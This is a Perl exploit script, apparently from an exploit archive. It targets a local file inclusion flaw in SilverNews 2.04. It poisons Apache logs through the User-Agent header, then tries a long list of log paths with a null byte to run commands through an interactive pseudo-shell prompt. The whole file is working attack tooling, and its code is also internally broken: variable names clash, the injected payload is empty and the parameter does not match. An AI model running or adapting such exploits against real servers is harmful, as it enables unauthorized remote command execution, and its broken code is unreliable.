#!/usr/bin/perl -w
# SilverNews 2.04 Local File Inclusion Exploit
# Script: http://www.silver-scripts.de
# Vuln C0de:
# require "admin/header.php";
# if (file_exists('admin/'.$_GET['section'].".php"))
# require 'admin/'.$_GET['section'].'.php'; --->LFI

# by d3b4g (Follow me on twitter.www.twitter.com/schaba)  
# From Tiny Little island of Maldivies
# Home page:Redhatlive.com/blog

use IO::Socket::INET;
use LWP::Simple;
my @apache_logs= qw(
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../.. /../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);
if (@ARGV < 3) {
print "
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 # SilverNews 2.04 Local File Inclusion Exploit               #
 #          SilverNews.pl [Victim] / (apachepath)             #   
 #       Ex: SilverNews.pl [Victim] / ../logs/error.log       #     
                  --by d3b4g---                     
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
";
exit();
}


$host=$ARGV[0];
$path=$ARGV[1];
$apachepath=$ARGV[2];
print "Code is injecting in logfile...\n";
$C0DE="";
$sock = IO::Socket::INET->new(
                                PeerAddr => $h0st,
                                PeerPort => 80,
                                Proto => "tcp"
                             ) || die "Can't connect to $host:80!\n";

print $socket "GET ".$path.$CODE." HTTP/1.1\r\n";
print $socket "user-Agent: ".$CODE."\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Connection: close\r\n\r\n";
close($socket);
print "Write END to exit!\n";
print "If not working try another apache path\n\n";
print "[shell] ";$cmd = <STDIN> ;
while($cmd !~ "END") {
$socket = IO::Socket::INET->new(Proto=>"tcp",
PeerAddr=>"$host", 
PeerPort=>"80") or die " Command are not executed.\n[-] Something wrong. Exploit Failed.\n\n";


print $socket "GET ".$path."index.php?op=".$apache[$apachepath]."%00&cmd=$cmd HTTP/1.1\r\n";
print $socket "Host: ".$host."\r\n";
print $socket "Accept: */*\r\n";
print $socket "Connection: close\r\n\r\n";
while ($pwn = <$socket>)
{
print $pwn;
}
print "[shell] ";
$cmd = <STDIN> ;
}

